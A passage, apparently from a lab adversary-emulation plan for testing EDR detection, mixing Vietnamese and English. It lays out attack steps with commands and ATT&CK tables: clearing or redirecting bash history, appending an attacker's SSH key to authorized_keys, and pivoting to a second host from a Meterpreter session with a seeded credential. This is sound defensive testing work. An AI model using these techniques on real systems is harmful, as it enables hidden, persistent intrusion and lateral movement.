| svcapp shreds/removes own ~/.bash_history file | Defense Evasion | T1070.003 | Indicator Removal: Clear Command History | Linux | TBD | TBD | Attacker deletes the on-disk command history file already flushed by bash during the Step 1/2 session, not just future logging. | app-host (10.10.10.10) | svcapp | - | [1] |
| svcapp symlinks ~/.bash_history to /dev/null | Defense Evasion | T1070.003 | Indicator Removal: Clear Command History | Linux | TBD | TBD | Attacker replaces the deleted history file with a symlink to `/dev/null` so future writes silently disappear at the filesystem level, independent of shell environment state. | app-host (10.10.10.10) | svcapp | - | [1] |
| svcapp shell disables HISTFILE and clears in-memory command history [no-artifact] | Defense Evasion | T1070.003 | Indicator Removal: Clear Command History | Linux | TBD | TBD | Attacker unsets `HISTFILE` and clears shell history to prevent the remainder of the session's commands from being logged. | app-host (10.10.10.10) | svcapp | - | [1] |

---

## Step 5 - Persistence: Thêm SSH Key vào `authorized_keys`

### Voice Track

Để không phụ thuộc vào shell tạm thời có từ Step 2, attacker thêm public key của mình vào `authorized_keys` của `svcapp`, tạo một đường truy cập độc lập, lâu dài trên `app-host`. Việc ghi file vẫn thực hiện trong session hiện có; ngay sau đó, attacker mở một kết nối SSH hoàn toàn mới bằng key vừa thêm **chỉ để xác nhận persistence hoạt động** - đây là một nhánh kiểm chứng độc lập, tách khỏi chuỗi hành vi chính, rồi đóng lại ngay.

Attacker **không** dùng phiên SSH mới này để tiếp tục Step 6. Kịch bản gốc thực hiện lateral movement khi vẫn còn nguyên process-tree `app daemon → bash → …` đã nêu ở [2] §2.2, không phải từ một phiên xác thực SSH độc lập mới qua `sshd` - nên để tái tạo đúng điều kiện đó, sau khi kiểm chứng xong, attacker quay lại đúng session Meterpreter đã có từ Step 2 (session mà Step 3/4 vẫn đang dùng) để thực hiện Step 6, giữ nguyên process-tree gốc.

### Procedures

- ☣️ Append public key của attacker vào `authorized_keys` của `svcapp`:

  ```bash
  echo "ssh-ed25519 AAAA... attacker@lab" >> ~/.ssh/authorized_keys
  ```

- Xác nhận truy cập lại bằng key mới (kết nối SSH mới, độc lập với session cũ):

  ```bash
  ssh -i attacker_key svcapp@10.10.10.10
  ```

  - ***Expected Output***
    ```text
    svcapp@app-host:~$
    ```

- Đóng phiên xác nhận này ngay sau khi kiểm tra xong - phiên này chỉ dùng để chứng minh persistence hoạt động, **không** dùng để thực hiện Step 6 (lý do: xem Voice Track):

  ```bash
  exit
  ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| svcapp authorized_keys append with attacker SSH public key | Persistence | T1098.004 | Account Manipulation: SSH Authorized Keys | Linux | TBD | TBD | Attacker appends their own SSH public key into `svcapp`'s `authorized_keys` file to establish independent, persistent access. | app-host (10.10.10.10) | svcapp | - | [1] |
| attacker SSH login to app-host using newly persisted key | Persistence | T1078.003 | Valid Accounts: Local Accounts | Linux | TBD | TBD | Attacker authenticates to `app-host` as `svcapp` using the just-added SSH key, opening a fresh session independent of the original foothold. | app-host (10.10.10.10) | svcapp | - | - |

---

## Step 6 - Lateral Movement / Valid Accounts: Pivot sang `target-host`

### Voice Track

Từ `app-host`, attacker dùng một credential hợp lệ để pivot sang host thứ hai trong mạng lab, mô phỏng đúng bước "truy cập hệ thống lân cận bằng tài khoản lấy được" của kịch bản gốc. Trong lab tự dựng, credential này được seed thủ công và minh bạch từ trước (`Setup.md` §4) - bản thân việc lấy credential không nằm trong phạm vi retest; chỉ hành vi SSH pivot bằng tài khoản đó mới là hành vi cần EDR phát hiện.

Bước pivot này thực hiện **trong session Meterpreter đã mở từ Step 2** (chính là session mà Step 3/4/5 đã dùng liên tục - bản thân session này là con cháu của tiến trình reverse-shell mà app daemon spawn ra ở Step 1 hoặc Step 1B), đã quay lại sau khi đóng phiên xác nhận persistence ở Step 5, không mở session mới. Nhờ vậy tiến trình `ssh` gọi pivot vẫn là con cháu trực tiếp của app daemon (`gunicorn → reverse-shell → backupv2 (meterpreter) → ssh`), đúng process-tree của lần khai thác gốc - không phải một lần xác thực SSH độc lập mới.

### Procedures

- ☣️ Từ session Meterpreter hiện có (mở từ Step 2, **không phải** phiên SSH mới mở ở Step 5), SSH sang `target-host` bằng credential `opsuser` đã seed:

  ```bash
  ssh opsuser@10.10.10.20
  ```

- Xác nhận truy cập thành công trên `target-host`:

  ```bash
  id
  ```

  - ***Expected Output***
    ```text
    uid=... gid=... groups=... (opsuser)
    ```

- **Biến thể đối chứng (tuỳ chọn, không bắt buộc):** lặp lại đúng lệnh pivot ở trên nhưng chạy từ một phiên SSH mới đăng nhập bằng key đã thêm ở Step 5 (thay vì từ session Step 2) - dùng để kiểm tra sản phẩm có thực sự dựa vào ancestry `app daemon → … → ssh` để phát hiện lateral movement hay phát hiện được bất kể tiến trình `ssh` xuất phát từ đâu. Không thay thế bước pivot chính ở trên:

  ```bash
  # ☣️ Chỉ chạy nếu muốn đối chứng - không dùng thay cho bước pivot chính
  ssh -i attacker_key svcapp@10.10.10.10 "ssh opsuser@10.10.10.20 id"
  ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| SSH pivot from app-host to target-host using seeded opsuser credential (source) | Lateral Movement | T1021.004 | Remote Services: SSH | Linux | TBD | TBD | From the still-active Meterpreter session opened in Step 2 (a descendant of the app daemon's reverse-shell process from Step 1/1B, not the Step 5 persistence-verification session), attacker initiates an SSH connection to `target-host` using a lab-seeded valid account, emulating lateral movement via a credential obtained earlier in the original chain. | app-host (10.10.10.10) | svcapp | - | [1] |
| SSH pivot from app-host to target-host using seeded opsuser credential (source) | Privilege Escalation | T1078.003 | Valid Accounts: Local Accounts | Linux | TBD | TBD | The SSH pivot is authenticated using a valid local `opsuser` credential rather than an exploit, abusing account trust to gain access on `target-host`. | app-host (10.10.10.10) | svcapp | - | [1] |
| SSH pivot from app-host to target-host using seeded opsuser credential (destination) | Lateral Movement | T1021.004 | Remote Services: SSH | Linux | TBD | TBD | `target-host` observes an inbound SSH authentication and session establishment for `opsuser` originating from `app-host`. | target-host (10.10.10.20) | opsuser | - | [1] |
| SSH pivot from app-host to target-host using seeded opsuser credential (destination) | Privilege Escalation | T1078.003 | Valid Accounts: Local Accounts | Linux | TBD | TBD | The inbound session on `target-host` is authenticated via the valid local `opsuser` account credential. | target-host (10.10.10.20) | opsuser | - | [1] |
| opsuser execve of `id` to confirm identity/access on target-host | Discovery | T1033 | System Owner/User Discovery | Linux | TBD | TBD | Immediately after the pivot, attacker runs `id` on `target-host` to confirm the account and group context obtained via the SSH session. | target-host (10.10.10.20) | opsuser | - | - |

---
